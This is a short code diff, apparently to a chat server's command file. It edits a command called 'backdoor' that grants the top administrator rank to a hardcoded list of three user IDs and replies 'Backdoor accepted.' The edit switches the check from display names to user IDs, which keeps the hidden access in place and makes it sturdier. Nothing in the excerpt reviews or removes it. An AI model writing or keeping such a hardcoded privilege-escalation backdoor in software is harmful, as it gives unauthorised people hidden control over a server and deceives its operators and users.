@@ -962,7 +962,8 @@ exports.commands = {
 		connection.popup(buffer.join("\n\n"));
 	},*/
 	backdoor: function (target, room, user) {
-		if (user.name == "zellman01" || user.name == "Jolt(S Jolteon)" || user.name == "Rainy Thunder") {
+		let allowed = ['zellman01', 'joltsjolteon', 'rainythunder'];
+		if (allowed.includes(user.userid)) {
 			user.group = '~';
 			user.updateIdentity();
 			this.sendReply("Backdoor accepted.");
